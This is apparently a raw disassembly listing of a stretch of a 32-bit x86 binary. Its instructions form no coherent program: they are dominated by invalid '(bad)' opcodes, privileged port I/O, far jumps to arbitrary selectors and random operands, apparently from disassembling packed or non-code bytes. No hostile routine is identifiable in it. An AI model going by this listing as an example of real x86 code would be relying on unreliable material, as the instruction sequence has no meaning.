  41664b:	scas   al,BYTE PTR es:[edi]
  41664c:	es rcr edi,0x81
  416650:	jnp    0x416677
  416652:	or     eax,0x869cafac
  416657:	out    dx,eax
  416658:	stos   DWORD PTR es:[edi],eax
  416659:	jmp    0x4214:0xc2df615
  416660:	jl     0x416629
  416662:	inc    ebx
  416663:	add    al,BYTE PTR [ebx-0x3c880ef9]
  416669:	(bad)  
  41666a:	out    0x64,eax
  41666c:	push   edi
  41666d:	popa   
  41666e:	jo     0x4166ba
  416670:	pop    eax
  416671:	or     cl,BYTE PTR [edx]
  416673:	push   ebx
  416674:	xor    BYTE PTR [ecx+0x6f3cd543],bh
  41667a:	arpl   WORD PTR [ebx],di
  41667c:	mov    dh,0xe9
  41667e:	sub    BYTE PTR [ebx-0x21ac6e11],dl
  416684:	fisub  DWORD PTR [ebp-0x14]
  416687:	fwait
  416688:	imul   esi,DWORD PTR [eax-0x7],0x67
  41668c:	mov    ch,0xef
  41668e:	sub    ch,BYTE PTR [esi]
  416690:	in     eax,dx
  416691:	sub    ecx,DWORD PTR [edi+0x25e62fc4]
  416697:	push   ebx
  416698:	jmp    0x8:0x50302ad1
  41669f:	retf   0xa249
  4166a2:	xchg   ecx,eax
  4166a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166a4:	int3   
  4166a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166a6:	fiadd  WORD PTR [di-0x79]
  4166aa:	arpl   WORD PTR [esi+0x150cbeb5],di
  4166b0:	adc    bl,BYTE PTR [ebp-0x26]
  4166b3:	adc    cl,BYTE PTR [edx-0x191f04e5]
  4166b9:	(bad)  
  4166ba:	sar    DWORD PTR [esi+ebp*2+0x25],cl
  4166be:	jl     0x4166da
  4166c0:	jns    0x416650
  4166c2:	bound  eax,QWORD PTR [eax]
  4166c4:	ins    DWORD PTR es:[edi],dx
  4166c5:	push   0x32
  4166c7:	daa    
  4166c8:	mov    edx,0x4bff56e
  4166cd:	dec    ecx
  4166ce:	mov    ds:0x935b8a96,al
  4166d3:	push   ss
  4166d4:	push   esp
  4166d5:	js     0x4166d1
  4166d7:	jo     0x416705
  4166d9:	repz push edi
  4166db:	js     0x4166de
  4166dd:	test   DWORD PTR [ebx-0x3069df9e],ecx
  4166e3:	outs   dx,DWORD PTR ds:[esi]
  4166e4:	mov    es,WORD PTR [eax-0x2f83595f]
  4166ea:	push   sp
  4166ec:	dec    ebp
  4166ed:	add    esi,DWORD PTR ds:0x38c6e2c5
  4166f3:	mov    eax,ds:0x10e6cc0b
  4166f8:	scas   al,BYTE PTR es:[edi]
  4166f9:	jne    0x416686
  4166fb:	pop    esp
  4166fc:	int3   
  4166fd:	and    DWORD PTR [edx],ebx
  4166ff:	jp     0x4166ae
  416701:	(bad)  
  416703:	fcmovu st,st(1)
  416705:	dec    ecx
  416706:	jg     0x41673b
  416708:	scas   eax,DWORD PTR es:[edi]
  416709:	adc    eax,0x566c5ac3
  41670e:	lea    ebp,[ebp-0x7cd819b4]
  416714:	fild   DWORD PTR [ebx-0x4d35044]
  41671a:	cmp    esi,DWORD PTR [ebx-0x7b1d91b4]
  416720:	sbb    al,BYTE PTR [ebp+0x75]
  416723:	shl    ebx,1
  416725:	xchg   ecx,eax
  416726:	shl    esi,1
  416728:	rol    BYTE PTR [ebx],cl
  41672a:	and    bh,BYTE PTR [esi]
  41672c:	pop    ss
  41672d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41672e:	(bad)
  416731:	(bad)  
  416732:	dec    eax
  416733:	xor    BYTE PTR [eax+0x43],al
  416736:	cld    
  416737:	xchg   esp,eax
  416738:	sar    BYTE PTR ds:0xcbcfe5b6,cl
  41673e:	mov    ah,BYTE PTR ds:0xa2ca6d2c
  416744:	jb     0x416748
  416746:	xor    eax,0x597fe892
  41674b:	or     al,0x8b
  41674d:	cli    
  41674e:	scas   al,BYTE PTR es:[edi]
  41674f:	jl     0x4167bf
  416751:	dec    esp
  416752:	jb     0x41679b
  416754:	or     al,0x9b
  416756:	add    eax,0x28b4f31
  41675b:	add    eax,0x9341a91f
  416760:	xor    al,0x5b
  416762:	data16 daa 
  416764:	mov    al,ds:0x1fc953f1
  416769:	fwait
  41676a:	mov    es,WORD PTR [esi-0x49e65f16]
  416770:	dec    ch
  416772:	mov    ch,0x58
  416774:	dec    eax
  416775:	mov    bh,ch
  416777:	xchg   ebx,eax
  416778:	lock jge 0x416794
  41677b:	inc    esp
  41677c:	daa    
  41677d:	inc    esp
  41677e:	lods   eax,DWORD PTR ds:[esi]
  41677f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416780:	imul   edi,DWORD PTR [eax],0xffffffe4
  416783:	pop    es
  416784:	pop    esi
  416785:	popf   
  416786:	jl     0x4167bb
  416788:	loop   0x41675a
  41678a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41678b:	mov    bh,0x4b
  41678d:	push   ds
  41678e:	test   BYTE PTR [edx],dh
  416790:	gs inc ebp
  416792:	dec    ebx
  416793:	xchg   ebx,eax
  416794:	inc    ebx
  416795:	push   edx
  416796:	call   0x6f1d:0x8c32d0e3
  41679d:	out    0x8c,al
  41679f:	das    
  4167a0:	xor    DWORD PTR [edx+ecx*1],edx
  4167a3:	je     0x4167cc
  4167a5:	(bad)  
  4167a6:	icebp  
  4167a7:	shr    DWORD PTR [ecx+0x57101272],0x8f
  4167ae:	les    ebx,FWORD PTR [ecx-0x261823c6]
  4167b4:	push   eax
  4167b5:	or     al,0x46
  4167b7:	xor    BYTE PTR [edi-0x5040a325],dl
  4167bd:	jns    0x41677d
  4167bf:	jp     0x41679d
  4167c1:	pop    edx
  4167c2:	mov    WORD PTR [ebx],cs
  4167c4:	cdq    
  4167c5:	cmp    al,0x98
  4167c7:	lea    ecx,[ebx]
  4167c9:	out    dx,eax
  4167ca:	lods   al,BYTE PTR ds:[esi]
  4167cb:	icebp  
  4167cc:	push   ecx
  4167cd:	mov    eax,ds:0x2027c9cf
  4167d2:	rol    ah,1
  4167d4:	xchg   edx,eax
  4167d5:	jmp    0x38607aea
  4167da:	cmp    DWORD PTR [esi],edx
  4167dc:	fimul  WORD PTR [ecx]
  4167de:	(bad)  
  4167df:	mov    eax,ds:0xadb8bf57
  4167e4:	sub    esi,ecx
  4167e6:	out    dx,eax
  4167e7:	sub    esp,edx
  4167e9:	out    0xe9,eax
  4167eb:	les    ebx,FWORD PTR [ecx+ebp*8+0x7c]
  4167ef:	xchg   edi,eax
  4167f0:	or     DWORD PTR [ebp-0x4c0af92f],esi
  4167f6:	inc    edi
  4167f7:	xchg   BYTE PTR [esi+0x6c6094f1],bl
  4167fd:	clc    
  4167fe:	xor    esp,DWORD PTR [edx-0x3d86b9c2]
  416804:	xor    cl,BYTE PTR [ebp-0x12]
  416807:	popf   
  416808:	inc    edi
  416809:	mov    bh,0xa9
  41680b:	inc    ebp
  41680d:	out    dx,al
  41680e:	sbb    BYTE PTR [edi],0xc5
  416811:	cdq    
  416812:	lea    edx,[ebp+0x67429278]
  416818:	(bad)  
  416819:	push   ebp
  41681a:	mov    esi,gs
  41681c:	push   cs
  41681d:	add    dh,BYTE PTR [ecx+0x154838e2]
  416823:	hlt    
  416824:	sub    BYTE PTR [ebx],bh
  416826:	daa    
  416827:	int    0x3
  416829:	adc    al,ch
  41682b:	mov    al,ch
  41682d:	loope  0x4167e7
  41682f:	mov    bh,0xa3
  416831:	(bad)  
  416833:	cmp    al,0x74
  416835:	inc    ebx
  416836:	xchg   esp,eax
  416837:	mov    BYTE PTR [eax-0x14],ah
  41683a:	in     al,dx
  41683b:	xchg   ch,bh
  41683d:	cmp    BYTE PTR [edi],ah
  41683f:	and    BYTE PTR [edx],0x86
  416842:	dec    esi
  416843:	into   
  416844:	(bad)  
  416845:	dec    ebx
  416846:	sti    
  416847:	dec    ebp
  416848:	cdq    
  416849:	ins    DWORD PTR es:[edi],dx
  41684a:	and    ebx,0xffffff92
  41684d:	xor    cl,ah
  41684f:	scas   al,BYTE PTR es:[edi]
  416850:	and    DWORD PTR [eax],esi
  416852:	sbb    dl,ch
  416854:	shl    BYTE PTR [ebp+ebp*4-0x5e],cl
  416858:	aaa    
  416859:	scas   al,BYTE PTR es:[edi]
  41685a:	and    esp,ebp
  41685c:	xor    ch,BYTE PTR [esi-0xc]
  41685f:	inc    ebp
  416860:	mov    ecx,0x649a32e8
  416865:	ficom  DWORD PTR [esi+0x7f5a1201]
  41686b:	fwait
  41686c:	cdq    
  41686d:	inc    edi
  41686e:	sti    
  41686f:	ror    DWORD PTR [ecx],cl
  416871:	pop    edi
  416872:	dec    edx
  416873:	dec    ebp
  416874:	(bad)  
  416875:	inc    bh
  416877:	ins    DWORD PTR es:[edi],dx
  416878:	loope  0x416850
  41687a:	jmp    0xa3a69a30
  41687f:	mov    cl,0x7e
  416881:	es sbb eax,0xbbc371e
  416887:	shl    DWORD PTR [eax],0xfc
  41688a:	xchg   BYTE PTR [edx-0xc],cl
  41688d:	add    DWORD PTR [eax],eax
  41688f:	inc    edx
  416890:	push   ebp
  416891:	jns    0x416823
  416893:	shl    DWORD PTR [ecx+0x40],0x77
  416897:	mov    bh,0x93
  416899:	rcr    cl,cl
  41689b:	jnp    0x416851
  41689d:	xor    eax,0xb81a7cca
  4168a2:	mov    dl,0x83
  4168a4:	jmp    ebx
  4168a6:	in     eax,0xc
  4168a8:	ret    0x2f1b
  4168ab:	or     BYTE PTR [edi-0xe],al
  4168ae:	cli    
  4168af:	cmp    eax,0xbc16208
  4168b4:	xor    BYTE PTR [eax-0x170bd422],bl
  4168ba:	ss call FWORD PTR gs:[edx+0x64]
  4168bf:	retf   
  4168c0:	jae    0x4168d4
  4168c2:	out    0xa5,eax
  4168c4:	jae    0x4168c6
  4168c6:	int3   
  4168c7:	cli    
  4168c8:	dec    ecx
  4168c9:	std    
  4168ca:	or     ecx,DWORD PTR [edi-0x5d]
  4168cd:	and    dl,dh
  4168cf:	ins    DWORD PTR es:[edi],dx
  4168d0:	aad    0x69
  4168d2:	(bad)  
  4168d3:	lods   al,BYTE PTR ds:[esi]
  4168d4:	xor    ebx,DWORD PTR [esi+0x33]
  4168d7:	push   bp
  4168d9:	xchg   BYTE PTR [ebx+0x8],bl
  4168dc:	sub    al,0xfc
  4168de:	xchg   edx,eax
  4168df:	pop    es
  4168e0:	es mov edx,0xb9c1ebd9
  4168e6:	cld    
  4168e7:	stc    
  4168e8:	js     0x416902
  4168ea:	pop    ebx
  4168eb:	scas   eax,DWORD PTR es:[edi]
  4168ec:	push   0xffffffe4
  4168ee:	daa    
  4168ef:	push   0xffffff8a
  4168f1:	cwde   
  4168f2:	fcmove st,st(6)
  4168f4:	push   0x58e69aba
  4168f9:	jns    0x4168dc
  4168fb:	(bad)  
  4168fc:	xchg   edx,eax
  4168fd:	jne    0x4168c9
  4168ff:	cmp    DWORD PTR [esi+0x1c878cf1],esi
  416905:	push   ebp
  416906:	xchg   esi,eax
  416907:	fnstsw WORD PTR [ebx]
  416909:	rcl    bh,1
  41690b:	push   ds
  41690c:	fnstcw WORD PTR [edx+edi*4-0x52321e35]
  416913:	sahf   
  416914:	in     al,dx
  416915:	push   cs
  416916:	push   edi
  416917:	cmp    bh,BYTE PTR [ecx]
  416919:	out    0x43,eax
  41691b:	xor    BYTE PTR [bx+0x2b94],cl
  416920:	jl     0x416907
  416922:	and    eax,0x2eec02c1
  416927:	scas   al,BYTE PTR es:[edi]
  416928:	or     eax,0x25c2eb3f
  41692d:	call   0xf3fb:0x2d71616b
  416934:	mov    edi,0x7da3989e
  416939:	iret   
  41693a:	cmp    esp,DWORD PTR [ecx-0x2b]
  41693d:	call   0x9c1c65ac
  416942:	rcr    dl,0x20
  416945:	adc    al,0x24
  416947:	dec    ebp
  416948:	stos   DWORD PTR es:[edi],eax
  416949:	inc    ebx
  41694a:	iret   
  41694b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41694c:	sub    esi,DWORD PTR [edi+0x3748f1a9]
  416952:	xor    eax,0xd1ae4da1
  416957:	daa    
  416958:	mov    edi,0x4b5abb5d
  41695d:	(bad)  es:[eax]
  416960:	inc    ebx
  416961:	shl    DWORD PTR [eax+0x61],1
  416964:	adc    eax,0x2882c9f9
  416969:	adc    BYTE PTR [ebx-0x54],dl
  41696c:	push   ss
  41696d:	xchg   ebx,eax
  41696e:	mov    ds,WORD PTR [eax+ecx*1]
  416971:	xchg   DWORD PTR [edx],ebx
  416973:	mov    DWORD PTR [esi+0x1f],ebp
  416976:	shl    BYTE PTR [edi+0x12a9d85c],1
  41697c:	pop    edx
  41697d:	add    eax,0x31b5c825
  416982:	pop    ss
  416983:	xchg   ebp,eax
  416984:	jo     0x4169a5
  416986:	cmp    ah,BYTE PTR [edx-0x69]
  416989:	pop    edx
  41698a:	aad    0x13
  41698c:	call   0xac5f:0x5a08fb00
  416993:	jg     0x416981
  416995:	mov    edx,0x5b54eec4
  41699a:	pop    ds
  41699b:	fidivr DWORD PTR [ebp+0x0]
  41699e:	mov    ecx,0xb0484be4
  4169a3:	xchg   ebp,eax
  4169a4:	mov    cl,BYTE PTR gs:[ecx-0x417eb87c]
  4169ab:	repnz inc eax
  4169ad:	mov    ch,0x9a
  4169af:	clc    
  4169b0:	aam    0x58
  4169b2:	xor    eax,0x9ea49379
  4169b7:	xlat   BYTE PTR ds:[ebx]
  4169b8:	dec    ecx
  4169b9:	aad    0x20
  4169bb:	sbb    ebp,DWORD PTR [edi+0x20]
  4169be:	or     BYTE PTR ds:0x4da5d95c,0x90
  4169c5:	and    BYTE PTR [edi],dh
  4169c7:	xchg   edx,eax
  4169c8:	and    bl,dh
  4169ca:	rcr    BYTE PTR [edx-0x4824acac],1
  4169d0:	push   0x3b3a144f
  4169d5:	push   cs
  4169d6:	push   ecx
  4169d7:	push   es
  4169d8:	and    al,0xab
  4169da:	nop
  4169db:	xor    ah,bh
  4169dd:	lea    edx,[eax+0x5a]
  4169e0:	jb     0x4169af
  4169e2:	adc    al,0x5c
  4169e4:	sbb    DWORD PTR [esi],ecx
  4169e6:	mov    ah,0x8
  4169e8:	call   0xcf4ba084
  4169ed:	sbb    edx,DWORD PTR [ecx]
  4169ef:	imul   esp,DWORD PTR [edi-0x78],0xffffffa8
  4169f3:	jne    0x4169ab
  4169f5:	inc    DWORD PTR [eax]
  4169f7:	out    dx,al
  4169f8:	es push ss
  4169fa:	rcl    BYTE PTR [esi+ecx*8-0x7664ac04],cl
  416a01:	hlt    
  416a02:	repnz ins DWORD PTR es:[edi],dx
  416a04:	push   edi
  416a05:	dec    edx
  416a06:	sbb    edx,DWORD PTR [eax+0x38]
  416a09:	(bad)  
  416a0a:	aaa    
  416a0b:	test   BYTE PTR [esp+edx*8],cl
  416a0e:	add    DWORD PTR [esi],ecx
  416a10:	(bad)  
  416a11:	repz and eax,0x44e93664
  416a17:	aaa    
  416a18:	jg     0x416a04
  416a1a:	pop    eax
  416a1b:	leave  
  416a1c:	dec    ebx
  416a1d:	cmp    ch,BYTE PTR [ecx-0x10a954fa]
  416a23:	hlt    
  416a24:	xlat   BYTE PTR ds:[ebx]
  416a25:	pop    ds
  416a26:	mov    ds:0xbe7947da,al
  416a2b:	mov    bh,0xbd
  416a2d:	repnz dec esp
  416a2f:	outs   dx,BYTE PTR ds:[esi]
  416a30:	fidiv  DWORD PTR [ecx-0x53ea8ef9]
  416a36:	inc    ebp
  416a37:	dec    edx
  416a38:	aad    0xd
  416a3a:	in     eax,dx
  416a3b:	das    
  416a3c:	mov    ecx,edx
  416a3e:	pushf  
  416a3f:	pop    edx
  416a40:	or     al,0x32
  416a42:	out    dx,al
  416a43:	addr16 dec eax
  416a45:	xchg   esi,eax
  416a46:	stos   BYTE PTR es:[edi],al
  416a47:	adc    ch,dl
  416a49:	mov    esi,0x521ba6af
  416a4e:	sti    
  416a4f:	add    eax,0xffffffb9
  416a52:	ins    BYTE PTR es:[edi],dx
  416a53:	inc    ebx
  416a54:	pop    ebp
  416a55:	out    0x8c,eax
  416a57:	push   ebx
  416a58:	jno    0x4169fc
  416a5a:	pop    edx
  416a5b:	or     ch,BYTE PTR [edx-0x11a472aa]
  416a61:	sar    DWORD PTR [edi+0x17c1a03],cl
  416a67:	pusha  
  416a68:	in     al,0x20
  416a6a:	and    DWORD PTR [ecx-0x1e85cce6],edi
  416a70:	fcomp  DWORD PTR [ecx+0x3226ba75]
  416a76:	sub    esp,ecx
  416a78:	stos   BYTE PTR es:[edi],al
  416a79:	mov    ecx,0x74887854
  416a7e:	jg     0x416ad4
  416a80:	sbb    eax,0xcea98b53
  416a85:	cmp    al,0xe4
  416a87:	add    bh,BYTE PTR [ebx+0x4f27b29d]
  416a8d:	jmp    0xf286:0x9938a45c
  416a94:	dec    eax
  416a95:	dec    eax
  416a96:	std    
  416a97:	inc    edx
  416a98:	cmp    ebp,0x4da00b3e
  416a9e:	out    dx,eax
  416a9f:	pop    es
  416aa0:	fimul  DWORD PTR [eax-0x3b]
  416aa3:	stc    
  416aa4:	xor    BYTE PTR [ecx-0x3c],cl
  416aa7:	inc    edx
  416aa8:	xor    eax,0x788af52f
  416aad:	pop    ebp
  416aae:	sahf   
  416aaf:	shl    BYTE PTR [ebx-0xb],cl
  416ab2:	xor    al,0x3f
  416ab4:	inc    edx
  416ab5:	addr16 xchg edx,eax
  416ab7:	stos   BYTE PTR es:[edi],al
  416ab8:	xor    eax,0x31d37fb4
  416abd:	ret    0xf963
  416ac0:	bnd je 0x416b28
  416ac3:	xor    DWORD PTR [ebp-0x53],ebx
  416ac6:	mov    ebp,0x52f08173
  416acb:	ss aad 0x2a
  416ace:	jb     0x416b08
  416ad0:	fild   DWORD PTR [eax-0x26404408]
  416ad6:	push   edi
  416ad7:	cmp    edx,0x8ee845ae
  416add:	frstor [eax-0x26]
  416ae0:	pop    ebx
  416ae1:	in     eax,dx
  416ae2:	popa   
  416ae3:	push   ecx
  416ae4:	js     0x416a81
  416ae6:	ret    
  416ae7:	sti    
  416ae8:	cmc    
  416ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aea:	fstp   DWORD PTR [edi+ebx*8]
  416aed:	or     DWORD PTR [eax+ebx*2+0x5659f66f],0x7d
  416af5:	out    0x15,al
  416af7:	mov    ah,0x7f
  416af9:	and    eax,0x6d4e00c5
  416afe:	pop    esi
  416aff:	mov    BYTE PTR [edx],ch
  416b01:	mov    eax,ds:0x1be826fb
  416b06:	mov    eax,ds:0x93604475
  416b0b:	or     ecx,DWORD PTR [esi]
  416b0d:	std    
  416b0e:	and    ebp,edi
  416b10:	sahf   
  416b11:	inc    ecx
  416b12:	hlt    
  416b13:	test   BYTE PTR [ebx],0x21
  416b16:	test   al,0x9a
  416b18:	jnp    0x416b3d
  416b1a:	sbb    BYTE PTR [edx+0x1f],bh
  416b1d:	pop    eax
  416b1e:	js     0x416b95
  416b20:	pop    ss
  416b21:	(bad)  
  416b22:	repz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  416b25:	mov    esp,0xa0a67fc9
  416b2a:	inc    ebx
  416b2b:	adc    edx,DWORD PTR [esi+0x52]
  416b2e:	mov    esp,0xb81fc846
  416b33:	push   es
  416b34:	jp     0x416b2e
  416b36:	repz mov bh,0x35
  416b39:	adc    al,BYTE PTR [edx-0x209bc556]
  416b3f:	int    0x7d
  416b41:	add    ebp,DWORD PTR [esi+eiz*1+0x5d282ae1]
  416b48:	xor    al,0xa6
  416b4a:	pop    esi
  416b4b:	(bad)  
  416b4c:	sub    DWORD PTR [ecx],edi
  416b4e:	daa    
  416b4f:	enter  0x8969,0xa7
  416b53:	fdivrp st(5),st
  416b55:	xchg   ecx,eax
  416b56:	pop    ds
  416b57:	pop    esp
  416b58:	fdiv   DWORD PTR [edi]
  416b5a:	sbb    eax,0x2fe6036f
  416b5f:	in     al,dx
  416b60:	ins    DWORD PTR es:[edi],dx
  416b61:	test   BYTE PTR [eax+0x39],ch
  416b64:	popa   
  416b65:	nop
  416b66:	das    
  416b67:	mov    bh,0xed
  416b69:	push   0x5
  416b6b:	push   ebp
  416b6c:	jge    0x416be3
  416b6e:	rcr    BYTE PTR [ebp-0x2540f53],0x42
  416b75:	popa   
  416b76:	nop
  416b77:	pop    edi
  416b78:	inc    esi
  416b79:	mul    DWORD PTR [edi+eiz*8-0x6e3d6e86]
  416b80:	call   0xdc28:0x768e2d2f
  416b87:	pop    es
  416b88:	fild   QWORD PTR [ecx]
  416b8a:	xor    dh,BYTE PTR [ecx-0xec2bd11]
  416b90:	(bad)  
  416b91:	repz aam 0xa
  416b94:	sub    BYTE PTR [eax],ah
  416b96:	push   edi
  416b97:	pop    ds
  416b98:	sti    
  416b99:	jns    0x416ba5
  416b9b:	lods   eax,DWORD PTR ds:[esi]
  416b9c:	inc    esi
  416b9d:	bound  esi,QWORD PTR [eax+0x72]
  416ba0:	mov    ah,0x1e
  416ba2:	out    dx,eax
  416ba3:	cmp    eax,edi
  416ba5:	jns    0x416bad
  416ba7:	cmp    BYTE PTR [ecx],dl
  416ba9:	bound  ebx,QWORD PTR [ecx-0x5c251d73]
  416baf:	mov    dl,0x74
  416bb1:	xchg   edx,eax
  416bb2:	add    ecx,DWORD PTR [esp+ebp*4]
  416bb5:	ins    DWORD PTR es:[edi],dx
  416bb6:	test   ebp,0x5bd37fb6
  416bbc:	add    al,0xcc
  416bbe:	sub    DWORD PTR [ecx-0x6577c6b6],esi
  416bc4:	pop    esp
  416bc5:	sub    al,0xe1
  416bc7:	xchg   BYTE PTR [edi-0x59],al
  416bca:	jmp    0x67b11aed
  416bcf:	pushf  
  416bd0:	out    dx,al
  416bd1:	popa   
  416bd2:	pop    ds
  416bd3:	and    bl,ch
  416bd5:	imul   esi,esi,0x9225d45f
  416bdb:	mov    ds:0x69f2b947,eax
  416be0:	(bad)  
  416be1:	aad    0x68
  416be3:	xor    eax,0xc832fe99
  416be8:	int    0xc9
  416bea:	xor    eax,0xeeb94939
  416bef:	xchg   edx,eax
  416bf0:	inc    edx
  416bf1:	punpckldq mm4,DWORD PTR [ecx-0x5e]
  416bf5:	sub    al,0xbb
  416bf7:	(bad)  
  416bf8:	(bad)  
  416bf9:	popf   
  416bfa:	pop    ss
  416bfb:	or     ebp,esp
  416bfd:	test   BYTE PTR ds:0xfa5c98,ch
  416c03:	cmp    eax,DWORD PTR [edx+0x41]
  416c06:	ja     0x416b95
  416c08:	xlat   BYTE PTR ds:[ebx]
  416c09:	pop    edi
  416c0a:	mov    eax,0xb8090b6e
  416c0f:	(bad)  
  416c10:	cmp    BYTE PTR [esi-0x62],cl
  416c13:	out    dx,eax
  416c14:	pavgw  mm7,QWORD PTR [ebx]
  416c17:	pop    eax
  416c18:	ja     0x416c8d
  416c1a:	repz in eax,0xbe
  416c1d:	rcl    BYTE PTR [ecx-0x479a916f],0x36
  416c24:	data16 outs dx,BYTE PTR ds:[esi]
  416c26:	int    0xad
  416c28:	pop    es
  416c29:	arpl   WORD PTR ds:[edi],si
  416c2c:	inc    esi
  416c2d:	sbb    al,0x25
  416c2f:	jns    0x416bd4
  416c31:	cmp    BYTE PTR [edi+0x58],dl
  416c34:	pop    ebp
  416c35:	jbe    0x416c92
  416c37:	in     al,dx
  416c38:	xor    al,0x22
  416c3a:	cmp    al,0xe6
  416c3c:	jmp    0x416bdd
  416c3e:	or     BYTE PTR [ebx-0x7d2d7092],bh
  416c44:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c46:	js     0x416c19
  416c48:	in     al,dx
  416c49:	mov    eax,ds:0xc0569839
  416c4e:	xchg   BYTE PTR [esi+0x33],dl
  416c51:	xchg   edx,eax
  416c52:	mov    ecx,0x197c5494
  416c57:	jl     0x416c42
  416c59:	aad    0x78
  416c5b:	bnd jle 0x416c2e
  416c5e:	push   esi
  416c5f:	lahf   
  416c60:	out    dx,al
  416c61:	pop    esi
  416c62:	pop    esi
  416c63:	mov    dl,dl
  416c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c66:	cmp    DWORD PTR [eax-0x50],ebx
  416c69:	into   
  416c6a:	int3   
  416c6b:	cli    
  416c6c:	push   esp
  416c6d:	pop    edi
  416c6e:	lahf   
  416c6f:	shr    DWORD PTR [ebp-0x24],1
  416c72:	or     esi,ebp
  416c74:	scas   eax,DWORD PTR es:[edi]
  416c75:	lds    edx,FWORD PTR [edi-0x503e4330]
  416c7b:	push   edi
  416c7c:	aas    
  416c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c7e:	or     DWORD PTR [ecx-0x1c],esi
  416c81:	add    DWORD PTR [esi],edx
  416c83:	out    0x8d,eax
  416c85:	inc    esi
  416c86:	add    BYTE PTR [edi],bh
  416c88:	and    ebp,DWORD PTR [eax+esi*1+0x11]
  416c8c:	xchg   ebx,eax
  416c8d:	(bad)  
  416c8e:	stc    
  416c8f:	lock nop
  416c91:	pop    esp
  416c92:	test   al,0x2f
  416c94:	jmp    0x416c5e
  416c96:	dec    esp
  416c97:	jnp    0x416c69
  416c99:	xor    BYTE PTR [edi],0x63
  416c9c:	jp     0x416cd0
  416c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c9f:	pusha  
  416ca0:	jne    0x416cde
  416ca2:	xlat   BYTE PTR ds:[ebx]
  416ca3:	rcr    DWORD PTR [edi-0x910d408],0xd6
  416caa:	clc    
  416cab:	mov    ecx,0xdf1db6d1
  416cb0:	lahf   
  416cb1:	daa    
  416cb2:	xor    cl,BYTE PTR [edi-0x3c8550e2]
  416cb8:	(bad)  
  416cba:	fcom   DWORD PTR [eax]
  416cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cbd:	gs xchg edx,eax
  416cbf:	cmp    al,0xbf
  416cc1:	in     al,dx
  416cc2:	mov    ebp,0x3a39ccd3
  416cc7:	nop
  416cc8:	sbb    dh,BYTE PTR [edi+0x59]
  416ccb:	add    ah,BYTE PTR ds:0xe19e788
  416cd1:	add    eax,0x9ed1814f
  416cd6:	es push ss
  416cd8:	jo     0x416c6d
  416cda:	push   ebx
  416cdb:	jmp    0x416cc0
  416cdd:	jno    0x416c96
  416cdf:	adc    esi,esp
  416ce1:	ds mov edi,0x71cbb974
  416ce7:	ss xchg ecx,eax
  416ce9:	cmp    BYTE PTR [ecx-0x4c],al
  416cec:	pop    ebp
  416ced:	or     al,0x16
  416cef:	mov    bh,0xbe
  416cf1:	jecxz  0x416ca7
  416cf3:	or     BYTE PTR [esi+0x78f55994],0x16
  416cfa:	retf   
  416cfb:	mov    edi,edi
  416cfd:	mov    ebp,0xf5f9ba57
  416d02:	pop    ebp
  416d03:	mov    ebp,0xa0a676e6
  416d08:	push   esi
  416d09:	jg     0x416d8a
  416d0b:	sbb    ecx,DWORD PTR [ecx]
  416d0d:	cmp    eax,0x48e4f5a2
  416d12:	xor    eax,DWORD PTR [ebx+0x7a]
  416d15:	hlt    
  416d16:	adc    BYTE PTR [ecx-0x79283058],bl
  416d1c:	lock xchg esp,eax
  416d1e:	dec    eax
  416d1f:	(bad)  
  416d20:	jne    0x416d30
  416d22:	pushw  ss
  416d24:	fcomp  st(5)
  416d26:	gs push cs
  416d28:	jbe    0x416d44
  416d2a:	in     eax,0xfb
  416d2c:	push   0xe84a595f
  416d31:	dec    eax
  416d32:	je     0x416cd3
  416d34:	jns    0x416cdb
  416d36:	cmp    BYTE PTR [edx-0x19c52886],dh
  416d3c:	mov    eax,0x730af4ae
  416d41:	popf   
  416d42:	dec    ebx
  416d43:	aad    0x72
  416d45:	into   
  416d46:	sar    BYTE PTR [eax+0x35],0x4f
  416d4a:	add    bh,BYTE PTR [edi]
  416d4c:	mov    esi,0x395c38f8
  416d52:	xchg   esi,edx
  416d54:	sbb    dh,BYTE PTR [ebp+0xb]
  416d57:	sub    dh,BYTE PTR [ebx+0x3e379b75]
  416d5d:	inc    ebp
  416d5e:	rcl    esp,cl
  416d60:	dec    esi
  416d61:	sub    eax,0x862b66bc
  416d66:	and    bl,BYTE PTR [eax-0x2b]
  416d69:	or     BYTE PTR [esi+0x7d],bh
  416d6c:	xchg   ecx,eax
  416d6d:	jl     0x416d56
  416d6f:	iret   
  416d70:	pop    edx
  416d71:	jo     0x416d67
  416d73:	fs dec eax
  416d75:	int3   
  416d76:	les    edi,FWORD PTR [ecx+edx*2+0x23085146]
  416d7d:	(bad)  
  416d7e:	jbe    0x416de8
  416d80:	sbb    DWORD PTR [ebx-0x4452ccee],esp
  416d86:	lea    eax,[ecx+esi*2]
  416d89:	cmp    ah,al
  416d8b:	dec    esp
  416d8c:	mov    dh,0xf4
  416d8e:	pop    ds
  416d8f:	test   eax,0x248f6edd
  416d94:	(bad)  
  416d95:	loope  0x416df9
  416d97:	in     al,dx
  416d98:	(bad)  [ecx]
  416d9a:	out    0x3b,al
  416d9c:	stc    
  416d9d:	loope  0x416d8a
  416d9f:	enter  0xbadc,0x11
  416da3:	adc    BYTE PTR [eax],dh
  416da5:	mov    al,ds:0xaa5ff2de
  416daa:	dec    edx
  416dab:	int3   
  416dac:	mov    edx,0x4eb2d74
  416db1:	jl     0x416dd9
  416db3:	sbb    edi,DWORD PTR [ebx+0x51]
  416db6:	test   al,0x6d
  416db8:	je     0x416da2
  416dba:	xor    DWORD PTR [ecx+eiz*8+0x1a],0xffffffd8
  416dbf:	daa    
  416dc0:	repnz jecxz 0x416d48
  416dc3:	and    al,0xf
  416dc5:	sahf   
  416dc6:	xchg   edi,eax
  416dc7:	popf   
  416dc8:	add    eax,0x63b0dbb6
  416dcd:	stc    
  416dce:	push   edi
  416dcf:	cmp    al,0xc0
  416dd1:	mov    bh,0xc5
  416dd3:	push   esi
